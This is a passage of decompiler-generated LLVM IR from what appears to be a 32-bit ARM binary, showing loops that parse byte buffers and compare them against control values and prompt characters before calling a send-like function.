  %v1_11818157 = phi i32 [ %v2_11818, %dec_label_pc_117e8.loopexit ], [ 0, %dec_label_pc_117c8 ]
  %v1_11810155 = phi i32 [ %v2_11810, %dec_label_pc_117e8.loopexit ], [ %v0_117d0, %dec_label_pc_117c8 ]
  %v1_117fc153 = phi i32 [ %v1_117e8, %dec_label_pc_117e8.loopexit ], [ %v3_117cc, %dec_label_pc_117c8 ]
  %v0_117f0151 = phi i32 [ %v2_11814, %dec_label_pc_117e8.loopexit ], [ %v1_117dc, %dec_label_pc_117c8 ]
  br label %dec_label_pc_117f0

dec_label_pc_117f0:                               ; preds = %dec_label_pc_117f0.preheader, %dec_label_pc_11870
  %v6_11898169 = phi i32 [ %v6_11898168, %dec_label_pc_117f0.preheader ], [ %v0_11878, %dec_label_pc_11870 ]
  %v1_11818 = phi i32 [ %v1_11818157, %dec_label_pc_117f0.preheader ], [ %v1_1187c, %dec_label_pc_11870 ]
  %v1_11810 = phi i32 [ %v1_11810155, %dec_label_pc_117f0.preheader ], [ %v1_11884, %dec_label_pc_11870 ]
  %v1_117e8 = phi i32 [ %v1_117fc153, %dec_label_pc_117f0.preheader ], [ %v3_11878, %dec_label_pc_11870 ]
  %v1_11814 = phi i32 [ %v0_117f0151, %dec_label_pc_117f0.preheader ], [ %v1_11888, %dec_label_pc_11870 ]
  %v1_117f0 = add i32 %v1_11814, -1
  %v2_117f0 = inttoptr i32 %v1_117f0 to i8*
  %v3_117f0 = load i8, i8* %v2_117f0, align 1
  %v4_117f0 = zext i8 %v3_117f0 to i32
  store i32 %v4_117f0, i32* %r3.global-to-local, align 4
  %v2_117f4 = icmp eq i8 %v3_117f0, -1
  store i1 %v2_117f4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_117f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117f4, label %dec_label_pc_117fc, label %dec_label_pc_11890

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117f0
  %v0_117fc = load i32, i32* @sb, align 4
  %v2_117fc = add i32 %v0_117fc, %v1_117e8
  store i32 %v2_117fc, i32* %r2.global-to-local, align 4
  %v3_11800 = icmp uge i32 %v2_117fc, %v1_11814
  store i1 %v3_11800, i1* %cpsr_c.global-to-local, align 1
  %v9_11800 = icmp eq i32 %v2_117fc, %v1_11814
  store i1 %v9_11800, i1* %cpsr_z.global-to-local, align 1
  %v2_11804 = xor i1 %v3_11800, true
  %v3_11804 = or i1 %v9_11800, %v2_11804
  br i1 %v3_11804, label %dec_label_pc_11890, label %dec_label_pc_11808

dec_label_pc_11808:                               ; preds = %dec_label_pc_117fc
  %v1_11808 = inttoptr i32 %v1_11814 to i8*
  %v2_11808 = load i8, i8* %v1_11808, align 1
  %v3_11808 = zext i8 %v2_11808 to i32
  store i32 %v3_11808, i32* %r3.global-to-local, align 4
  %v2_1180c = icmp eq i8 %v2_11808, -1
  store i1 %v2_1180c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_1180c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1180c, label %dec_label_pc_117e8.loopexit, label %dec_label_pc_11820

dec_label_pc_11820:                               ; preds = %dec_label_pc_11808
  %v2_11820 = icmp ugt i8 %v2_11808, -4
  store i1 %v2_11820, i1* %cpsr_c.global-to-local, align 1
  %v7_11820 = icmp eq i8 %v2_11808, -3
  store i1 %v7_11820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11820, label %dec_label_pc_11fb8, label %dec_label_pc_11828

dec_label_pc_11828:                               ; preds = %dec_label_pc_11820
  %v1_11828 = add i32 %v1_11810, 2
  store i32 %v1_11828, i32* %r3.global-to-local, align 4
  %v3_1182c = icmp uge i32 %v2_117fc, %v1_11828
  store i1 %v3_1182c, i1* %cpsr_c.global-to-local, align 1
  %v9_1182c = icmp eq i32 %v2_117fc, %v1_11828
  store i1 %v9_1182c, i1* %cpsr_z.global-to-local, align 1
  %v2_11830 = xor i1 %v3_1182c, true
  %v3_11830 = or i1 %v9_1182c, %v2_11830
  br i1 %v3_11830, label %dec_label_pc_11890, label %dec_label_pc_11834

dec_label_pc_11834:                               ; preds = %bb342, %dec_label_pc_1200c, %bb341, %dec_label_pc_11828
  %v0_11834 = load i32, i32* @r4, align 4
  %v1_11834 = inttoptr i32 %v0_11834 to i8*
  %v2_11834 = load i8, i8* %v1_11834, align 1
  %v3_11834 = zext i8 %v2_11834 to i32
  store i32 %v3_11834, i32* %r3.global-to-local, align 4
  %v2_11838 = icmp ugt i8 %v2_11834, -4
  store i1 %v2_11838, i1* %cpsr_c.global-to-local, align 1
  %v7_11838 = icmp eq i8 %v2_11834, -3
  store i1 %v7_11838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11838, label %bb313, label %dec_label_pc_11844

bb313:                                            ; preds = %dec_label_pc_11834
  %v1_1183c = load i32, i32* @r8, align 4
  %v2_1183c = trunc i32 %v1_1183c to i8
  store i8 %v2_1183c, i8* %v1_11834, align 1
  %v0_11840.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11840.pr, label %bb315, label %.dec_label_pc_11844_crit_edge

.dec_label_pc_11844_crit_edge:                    ; preds = %bb313
  %v0_11844.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11844

dec_label_pc_11844:                               ; preds = %.dec_label_pc_11844_crit_edge, %dec_label_pc_11834
  %v0_11844 = phi i32 [ %v0_11844.pre, %.dec_label_pc_11844_crit_edge ], [ %v3_11834, %dec_label_pc_11834 ]
  %v2_11844 = icmp ugt i32 %v0_11844, 250
  store i1 %v2_11844, i1* %cpsr_c.global-to-local, align 1
  %v7_11844 = icmp eq i32 %v0_11844, 251
  store i1 %v7_11844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11844, label %bb314, label %bb315

bb314:                                            ; preds = %dec_label_pc_11844
  %v1_11848 = load i32, i32* %sl.global-to-local, align 4
  %v2_11848 = trunc i32 %v1_11848 to i8
  %v3_11848 = load i32, i32* @r4, align 4
  %v4_11848 = inttoptr i32 %v3_11848 to i8*
  store i8 %v2_11848, i8* %v4_11848, align 1
  br label %bb315

bb315:                                            ; preds = %bb313, %dec_label_pc_11844, %bb314
  %v0_1184c = load i32, i32* @r4, align 4
  %v1_1184c = add i32 %v0_1184c, 1
  %v2_1184c = inttoptr i32 %v1_1184c to i8*
  %v3_1184c = load i8, i8* %v2_1184c, align 1
  %v4_1184c = zext i8 %v3_1184c to i32
  store i32 %v4_1184c, i32* %r3.global-to-local, align 4
  %v2_11850 = icmp ugt i8 %v3_1184c, -4
  store i1 %v2_11850, i1* %cpsr_c.global-to-local, align 1
  %v7_11850 = icmp eq i8 %v3_1184c, -3
  store i1 %v7_11850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11850, label %bb316, label %dec_label_pc_1185c

bb316:                                            ; preds = %bb315
  %v1_11854 = load i32, i32* @r8, align 4
  %v2_11854 = trunc i32 %v1_11854 to i8
  store i8 %v2_11854, i8* %v2_1184c, align 1
  %v0_11858.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11858.pr, label %bb318, label %.dec_label_pc_1185c_crit_edge

.dec_label_pc_1185c_crit_edge:                    ; preds = %bb316
  %v0_1185c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %.dec_label_pc_1185c_crit_edge, %bb315
  %v0_1185c = phi i32 [ %v0_1185c.pre, %.dec_label_pc_1185c_crit_edge ], [ %v4_1184c, %bb315 ]
  %v2_1185c = icmp ugt i32 %v0_1185c, 250
  store i1 %v2_1185c, i1* %cpsr_c.global-to-local, align 1
  %v7_1185c = icmp eq i32 %v0_1185c, 251
  store i1 %v7_1185c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1185c, label %bb317, label %bb318

bb317:                                            ; preds = %dec_label_pc_1185c
  %v1_11860 = load i32, i32* %sl.global-to-local, align 4
  %v2_11860 = trunc i32 %v1_11860 to i8
  %v3_11860 = load i32, i32* @r4, align 4
  %v4_11860 = add i32 %v3_11860, 1
  %v5_11860 = inttoptr i32 %v4_11860 to i8*
  store i8 %v2_11860, i8* %v5_11860, align 1
  br label %bb318

bb318:                                            ; preds = %bb316, %dec_label_pc_1185c, %bb317
  %v0_11864 = load i32, i32* @r5, align 4
  %v1_11864 = add i32 %v0_11864, 4
  %v2_11864 = inttoptr i32 %v1_11864 to i32*
  %v3_11864 = load i32, i32* %v2_11864, align 4
  store i32 %v3_11864, i32* %r0.global-to-local, align 4
  %v0_11868 = load i32, i32* @r6, align 4
  br label %dec_label_pc_11870

dec_label_pc_11870:                               ; preds = %dec_label_pc_120e4, %bb318
  %v0_11874 = phi i32 [ %v3_120fc, %dec_label_pc_120e4 ], [ %v3_11864, %bb318 ]
  %storemerge5 = phi i32 [ %v2_11fd0, %dec_label_pc_120e4 ], [ %v0_11868, %bb318 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_120e4 ], [ 3, %bb318 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11874 = inttoptr i32 %storemerge5 to i32*
  %v5_11874 = call i32 @function_13f00(i32 %v0_11874, i32* %v4_11874, i32 %storemerge, i32 16384)
  store i32 %v5_11874, i32* %r0.global-to-local, align 4
  %v0_11878 = load i32, i32* @r5, align 4
  %v1_11878 = add i32 %v0_11878, 24
  %v2_11878 = inttoptr i32 %v1_11878 to i32*
  %v3_11878 = load i32, i32* %v2_11878, align 4
  store i32 %v3_11878, i32* %ip.global-to-local, align 4
  %v0_1187c = load i32, i32* @r7, align 4
  %v1_1187c = add i32 %v0_1187c, 3
  store i32 %v1_1187c, i32* @r7, align 4
  %v3_11880 = icmp uge i32 %v1_1187c, %v3_11878
  store i1 %v3_11880, i1* %cpsr_c.global-to-local, align 1
  %v9_11880 = icmp eq i32 %v1_1187c, %v3_11878
  store i1 %v9_11880, i1* %cpsr_z.global-to-local, align 1
  %v0_11884 = load i32, i32* @r6, align 4
  %v1_11884 = add i32 %v0_11884, 3
  store i32 %v1_11884, i32* @r6, align 4
  %v0_11888 = load i32, i32* @r4, align 4
  %v1_11888 = add i32 %v0_11888, 3
  store i32 %v1_11888, i32* @r4, align 4
  %v5_1188c = icmp slt i32 %v1_1187c, %v3_11878
  br i1 %v5_1188c, label %dec_label_pc_117f0, label %dec_label_pc_11890

dec_label_pc_11890:                               ; preds = %dec_label_pc_117e8.loopexit, %dec_label_pc_117f0, %dec_label_pc_11870, %dec_label_pc_11828, %dec_label_pc_117fc, %dec_label_pc_117c8, %dec_label_pc_11fb8.dec_label_pc_11890.loopexit_crit_edge
  %v6_11898 = phi i32 [ %v0_11fdc, %dec_label_pc_11fb8.dec_label_pc_11890.loopexit_crit_edge ], [ %v0_11790, %dec_label_pc_117c8 ], [ %v6_11898169, %dec_label_pc_117f0 ], [ %v0_11878, %dec_label_pc_11870 ], [ %v6_11898169, %dec_label_pc_11828 ], [ %v6_11898169, %dec_label_pc_117fc ], [ %v6_11898169, %dec_label_pc_117e8.loopexit ]
  %v0_118a0.pre = phi i32 [ %v0_11890.pre.pre, %dec_label_pc_11fb8.dec_label_pc_11890.loopexit_crit_edge ], [ 0, %dec_label_pc_117c8 ], [ %v1_11818, %dec_label_pc_117f0 ], [ %v1_1187c, %dec_label_pc_11870 ], [ %v1_11818, %dec_label_pc_11828 ], [ %v1_11818, %dec_label_pc_117fc ], [ %v2_11818, %dec_label_pc_117e8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11890 = icmp eq i32 %v0_118a0.pre, 0
  store i1 %v2_11890, i1* %cpsr_z.global-to-local, align 1
  %tmp319 = icmp slt i32 %v0_118a0.pre, 1
  br i1 %tmp319, label %dec_label_pc_118a0, label %.thread204

.thread204:                                       ; preds = %dec_label_pc_11890
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_11898 = add i32 %v6_11898, 12
  %v8_11898 = inttoptr i32 %v7_11898 to i32*
  store i32 3, i32* %v8_11898, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11890, %dec_label_pc_11f58, %dec_label_pc_11e30, %dec_label_pc_11d4c, %dec_label_pc_11c98, %dec_label_pc_11be4, %dec_label_pc_11b30, %dec_label_pc_11a98, %dec_label_pc_11a08
  %v0_118a0 = phi i32 [ %v1_11f4c, %dec_label_pc_11f58 ], [ %v0_11e28, %dec_label_pc_11e30 ], [ %v1_11d40, %dec_label_pc_11d4c ], [ %v1_11c8c, %dec_label_pc_11c98 ], [ %v1_11bd8, %dec_label_pc_11be4 ], [ %v1_11b24, %dec_label_pc_11b30 ], [ %v0_11a98, %dec_label_pc_11a98 ], [ %v0_11a08, %dec_label_pc_11a08 ], [ %v0_118a0.pre, %dec_label_pc_11890 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_118a0 = icmp eq i32 %v0_118a0, 0
  store i1 %v2_118a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118a0, label %dec_label_pc_1170c.loopexit, label %dec_label_pc_118a8

dec_label_pc_118a8:                               ; preds = %dec_label_pc_118a0
  %v0_118a8 = load i32, i32* @r5, align 4
  %v1_118a8 = add i32 %v0_118a8, 24
  %v2_118a8 = inttoptr i32 %v1_118a8 to i32*
  %v3_118a8 = load i32, i32* %v2_118a8, align 4
  store i32 %v3_118a8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_118b0:                               ; preds = %dec_label_pc_11790
  %v1_118b0 = add i32 %v0_11790, 24
  %v2_118b0 = inttoptr i32 %v1_118b0 to i32*
  %v3_118b0 = load i32, i32* %v2_118b0, align 4
  store i32 %v3_118b0, i32* %ip.global-to-local, align 4
  %v1_118b4 = add i32 %v3_118b0, -1
  store i32 %v1_118b4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_118b8 = icmp eq i32 %v1_118b4, 0
  store i1 %v2_118b8, i1* %cpsr_z.global-to-local, align 1
  %v5_118bc = icmp sgt i32 %v1_118b4, 0
  br i1 %v5_118bc, label %dec_label_pc_119e8, label %dec_label_pc_116cc

dec_label_pc_119c8:                               ; preds = %bb320
  %v2_119c8 = icmp ugt i8 %v3_119ec, 35
  store i1 %v2_119c8, i1* %cpsr_c.global-to-local, align 1
  %v7_119c8 = icmp eq i8 %v3_119ec, 36
  store i1 %v7_119c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119c8, label %dec_label_pc_119fc, label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119c8
  %v2_119d0 = icmp ugt i8 %v3_119ec, 34
  store i1 %v2_119d0, i1* %cpsr_c.global-to-local, align 1
  %v7_119d0 = icmp eq i8 %v3_119ec, 35
  store i1 %v7_119d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119d0, label %dec_label_pc_119fc, label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119d0
  %v2_119d8 = icmp ugt i8 %v3_119ec, 36
  store i1 %v2_119d8, i1* %cpsr_c.global-to-local, align 1
  %v7_119d8 = icmp eq i8 %v3_119ec, 37
  store i1 %v7_119d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119d8, label %dec_label_pc_119fc, label %dec_label_pc_119e0

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119d8
  %v1_119e0 = add i32 %v0_119fc, -1
  store i32 %v1_119e0, i32* %r0.global-to-local, align 4
  %v2_119e0 = icmp ne i32 %v0_119fc, 0
  store i1 %v2_119e0, i1* %cpsr_c.global-to-local, align 1
  %v7_119e0 = icmp eq i32 %v0_119fc, 1
  store i1 %v7_119e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119e0, label %dec_label_pc_116cc, label %dec_label_pc_119e8

dec_label_pc_119e8:                               ; preds = %dec_label_pc_118b0, %dec_label_pc_119e0
  %v0_119fc = phi i32 [ %v1_119e0, %dec_label_pc_119e0 ], [ %v1_118b4, %dec_label_pc_118b0 ]
  %v2_119e8 = add i32 %v0_119fc, %v0_11790
  store i32 %v2_119e8, i32* %r3.global-to-local, align 4
  %v1_119ec = add i32 %v2_119e8, 28
  %v2_119ec = inttoptr i32 %v1_119ec to i8*
  %v3_119ec = load i8, i8* %v2_119ec, align 1
  %v4_119ec = zext i8 %v3_119ec to i32
  store i32 %v4_119ec, i32* %r3.global-to-local, align 4
  %v2_119f0 = icmp ugt i8 %v3_119ec, 61
  store i1 %v2_119f0, i1* %cpsr_c.global-to-local, align 1
  %v7_119f0 = icmp eq i8 %v3_119ec, 62
  store i1 %v7_119f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_119f0, label %dec_label_pc_119fc, label %bb320

bb320:                                            ; preds = %dec_label_pc_119e8
  %v3_119f4 = icmp ugt i8 %v3_119ec, 57
  store i1 %v3_119f4, i1* %cpsr_c.global-to-local, align 1
  %v8_119f4 = icmp eq i8 %v3_119ec, 58
  store i1 %v8_119f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_119f4, label %dec_label_pc_119fc, label %dec_label_pc_119c8

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119e8, %bb320, %dec_label_pc_119d8, %dec_label_pc_119d0, %dec_label_pc_119c8
  %v1_119fc = add i32 %v0_119fc, 1
  store i32 %v1_119fc, i32* @r7, align 4
  %v2_11a00 = icmp eq i32 %v1_119fc, -1
  store i1 %v2_11a00, i1* %cpsr_c.global-to-local, align 1
  %v7_11a00 = icmp eq i32 %v0_119fc, -2
  store i1 %v7_11a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a00, label %dec_label_pc_116cc, label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119fc, %dec_label_pc_116ec, %dec_label_pc_116cc
  %v0_11a08 = phi i32 [ %v5_116fc, %dec_label_pc_116ec ], [ %v5_116dc, %dec_label_pc_116cc ], [ %v1_119fc, %dec_label_pc_119fc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11a08 = icmp eq i32 %v0_11a08, 0
  store i1 %v2_11a08, i1* %cpsr_z.global-to-local, align 1
  %tmp321 = icmp slt i32 %v0_11a08, 1
  br i1 %tmp321, label %dec_label_pc_118a0, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_11a08
  %v0_11a10 = load i32, i32* @r5, align 4
  %v1_11a10 = inttoptr i32 %v0_11a10 to i32*
  %v2_11a10 = load i32, i32* %v1_11a10, align 4
  store i32 %v2_11a10, i32* %r3.global-to-local, align 4
  %v1_11a14 = add i32 %v0_11a10, 4
  %v2_11a14 = inttoptr i32 %v1_11a14 to i32*
  %v3_11a14 = load i32, i32* %v2_11a14, align 4
  store i32 %v3_11a14, i32* %r0.global-to-local, align 4
  %v1_11a18 = add i32 %v2_11a10, 12
  %v2_11a18 = inttoptr i32 %v1_11a18 to i8*
  %v3_11a18 = load i8, i8* %v2_11a18, align 1
  %v4_11a18 = zext i8 %v3_11a18 to i32
  store i32 %v4_11a18, i32* %r2.global-to-local, align 4
  %v1_11a1c = inttoptr i32 %v2_11a10 to i32*
  %v2_11a1c = load i32, i32* %v1_11a1c, align 4
  store i32 %v2_11a1c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11a24 = inttoptr i32 %v2_11a1c to i32*
  %v5_11a24 = call i32 @function_13f00(i32 %v3_11a14, i32* %v4_11a24, i32 %v4_11a18, i32 16384)
  store i32 %v5_11a24, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11a2c = load i32, i32* @r5, align 4
  %v1_11a2c = add i32 %v0_11a2c, 4
  %v2_11a2c = inttoptr i32 %v1_11a2c to i32*
  %v3_11a2c = load i32, i32* %v2_11a2c, align 4
  store i32 %v3_11a2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_11a38 = call i32 @function_13f00(i32 %v3_11a2c, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 %v5_11a38, i32* %r0.global-to-local, align 4
  %v0_11a3c = load i32, i32* @r5, align 4
  %v1_11a3c = add i32 %v0_11a3c, 24
  %v2_11a3c = inttoptr i32 %v1_11a3c to i32*
  %v3_11a3c = load i32, i32* %v2_11a3c, align 4
  store i32 %v3_11a3c, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_11a44 = add i32 %v0_11a3c, 12
  %v3_11a44 = inttoptr i32 %v2_11a44 to i32*
  store i32 4, i32* %v3_11a44, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11790
  %v1_11a4c = add i32 %v0_11790, 24
  %v2_11a4c = inttoptr i32 %v1_11a4c to i32*
  %v3_11a4c = load i32, i32* %v2_11a4c, align 4
  store i32 %v3_11a4c, i32* %ip.global-to-local, align 4
  %v1_11a50 = add i32 %v3_11a4c, -1
  store i32 %v1_11a50, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11a54 = icmp eq i32 %v1_11a50, 0
  store i1 %v2_11a54, i1* %cpsr_z.global-to-local, align 1
  %v5_11a58 = icmp sgt i32 %v1_11a50, 0
  br i1 %v5_11a58, label %dec_label_pc_11a78, label %dec_label_pc_120c0

dec_label_pc_11a60:                               ; preds = %bb322
  %v2_11a60 = icmp ugt i8 %v3_11a7c, 35
  store i1 %v2_11a60, i1* %cpsr_c.global-to-local, align 1
  %v7_11a60 = icmp eq i8 %v3_11a7c, 36
  store i1 %v7_11a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a60, label %dec_label_pc_11a8c, label %dec_label_pc_11a68

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a60
  %v2_11a68 = icmp ugt i8 %v3_11a7c, 34
  store i1 %v2_11a68, i1* %cpsr_c.global-to-local, align 1
  %v7_11a68 = icmp eq i8 %v3_11a7c, 35
  store i1 %v7_11a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a68, label %dec_label_pc_11a8c, label %dec_label_pc_11a70

dec_label_pc_11a70:                               ; preds = %dec_label_pc_11a68
  %v1_11a70 = add i32 %v0_11a8c, -1
  store i32 %v1_11a70, i32* %r0.global-to-local, align 4
  %v2_11a70 = icmp ne i32 %v0_11a8c, 0
  store i1 %v2_11a70, i1* %cpsr_c.global-to-local, align 1
  %v7_11a70 = icmp eq i32 %v0_11a8c, 1
  store i1 %v7_11a70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a70, label %dec_label_pc_120c0, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a4c, %dec_label_pc_11a70
  %v0_11a8c = phi i32 [ %v1_11a70, %dec_label_pc_11a70 ], [ %v1_11a50, %dec_label_pc_11a4c ]
  %v2_11a78 = add i32 %v0_11a8c, %v0_11790
  store i32 %v2_11a78, i32* %r3.global-to-local, align 4
  %v1_11a7c = add i32 %v2_11a78, 28
  %v2_11a7c = inttoptr i32 %v1_11a7c to i8*
  %v3_11a7c = load i8, i8* %v2_11a7c, align 1
  %v4_11a7c = zext i8 %v3_11a7c to i32
  store i32 %v4_11a7c, i32* %r3.global-to-local, align 4
  %v2_11a80 = icmp ugt i8 %v3_11a7c, 61
  store i1 %v2_11a80, i1* %cpsr_c.global-to-local, align 1
  %v7_11a80 = icmp eq i8 %v3_11a7c, 62
  store i1 %v7_11a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a80, label %dec_label_pc_11a8c, label %bb322

bb322:                                            ; preds = %dec_label_pc_11a78
  %v3_11a84 = icmp ugt i8 %v3_11a7c, 57
  store i1 %v3_11a84, i1* %cpsr_c.global-to-local, align 1
  %v8_11a84 = icmp eq i8 %v3_11a7c, 58
  store i1 %v8_11a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11a84, label %dec_label_pc_11a8c, label %dec_label_pc_11a60

dec_label_pc_11a8c:                               ; preds = %dec_label_pc_11a78, %bb322, %dec_label_pc_11a68, %dec_label_pc_11a60
  %v1_11a8c = add i32 %v0_11a8c, 1
  store i32 %v1_11a8c, i32* @r7, align 4
  %v2_11a90 = icmp eq i32 %v1_11a8c, -1
  store i1 %v2_11a90, i1* %cpsr_c.global-to-local, align 1
  %v7_11a90 = icmp eq i32 %v0_11a8c, -2
  store i1 %v7_11a90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a90, label %dec_label_pc_120c0, label %dec_label_pc_11a98

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11a8c, %dec_label_pc_120c0
  %v0_11a98 = phi i32 [ %v5_120d0, %dec_label_pc_120c0 ], [ %v1_11a8c, %dec_label_pc_11a8c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11a98 = icmp eq i32 %v0_11a98, 0
  store i1 %v2_11a98, i1* %cpsr_z.global-to-local, align 1
  %tmp323 = icmp slt i32 %v0_11a98, 1
  br i1 %tmp323, label %dec_label_pc_118a0, label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a98
  %v0_11aa0 = load i32, i32* @r5, align 4
  %v1_11aa0 = inttoptr i32 %v0_11aa0 to i32*
  %v2_11aa0 = load i32, i32* %v1_11aa0, align 4
  store i32 %v2_11aa0, i32* %r3.global-to-local, align 4
  %v1_11aa4 = add i32 %v0_11aa0, 4
  %v2_11aa4 = inttoptr i32 %v1_11aa4 to i32*
  %v3_11aa4 = load i32, i32* %v2_11aa4, align 4
  store i32 %v3_11aa4, i32* %r0.global-to-local, align 4
  %v1_11aa8 = add i32 %v2_11aa0, 13
  %v2_11aa8 = inttoptr i32 %v1_11aa8 to i8*
  %v3_11aa8 = load i8, i8* %v2_11aa8, align 1
  %v4_11aa8 = zext i8 %v3_11aa8 to i32
  store i32 %v4_11aa8, i32* %r2.global-to-local, align 4
  %v1_11aac = add i32 %v2_11aa0, 4
  %v2_11aac = inttoptr i32 %v1_11aac to i32*
  %v3_11aac = load i32, i32* %v2_11aac, align 4
  store i32 %v3_11aac, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11ab4 = inttoptr i32 %v3_11aac to i32*
  %v5_11ab4 = call i32 @function_13f00(i32 %v3_11aa4, i32* %v4_11ab4, i32 %v4_11aa8, i32 16384)
  store i32 %v5_11ab4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11abc = load i32, i32* @r5, align 4
  %v1_11abc = add i32 %v0_11abc, 4
  %v2_11abc = inttoptr i32 %v1_11abc to i32*
  %v3_11abc = load i32, i32* %v2_11abc, align 4
  store i32 %v3_11abc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_11ac8 = call i32 @function_13f00(i32 %v3_11abc, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 %v5_11ac8, i32* %r0.global-to-local, align 4
  %v0_11acc = load i32, i32* @r5, align 4
  %v1_11acc = add i32 %v0_11acc, 24
  %v2_11acc = inttoptr i32 %v1_11acc to i32*
  %v3_11acc = load i32, i32* %v2_11acc, align 4
  store i32 %v3_11acc, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_11ad4 = add i32 %v0_11acc, 12
  %v3_11ad4 = inttoptr i32 %v2_11ad4 to i32*
  store i32 5, i32* %v3_11ad4, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11790
  %v1_11adc = add i32 %v0_11790, 24
  %v2_11adc = inttoptr i32 %v1_11adc to i32*
  %v3_11adc = load i32, i32* %v2_11adc, align 4
  store i32 %v3_11adc, i32* %ip.global-to-local, align 4
  %v1_11ae0 = add i32 %v3_11adc, -1
  store i32 %v1_11ae0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11ae4 = icmp eq i32 %v1_11ae0, 0
  store i1 %v2_11ae4, i1* %cpsr_z.global-to-local, align 1
  %v5_11ae8 = icmp sgt i32 %v1_11ae0, 0
  br i1 %v5_11ae8, label %dec_label_pc_11b10, label %dec_label_pc_11710thread-pre-split.thread

dec_label_pc_11af0:                               ; preds = %bb324
  %v2_11af0 = icmp ugt i8 %v3_11b14, 35
  store i1 %v2_11af0, i1* %cpsr_c.global-to-local, align 1
  %v7_11af0 = icmp eq i8 %v3_11b14, 36
  store i1 %v7_11af0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11af0, label %dec_label_pc_11b24, label %dec_label_pc_11af8

dec_label_pc_11af8:                               ; preds = %dec_label_pc_11af0
  %v2_11af8 = icmp ugt i8 %v3_11b14, 34
  store i1 %v2_11af8, i1* %cpsr_c.global-to-local, align 1
  %v7_11af8 = icmp eq i8 %v3_11b14, 35
  store i1 %v7_11af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11af8, label %dec_label_pc_11b24, label %dec_label_pc_11b00

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11af8
  %v2_11b00 = icmp ugt i8 %v3_11b14, 36
  store i1 %v2_11b00, i1* %cpsr_c.global-to-local, align 1
  %v7_11b00 = icmp eq i8 %v3_11b14, 37
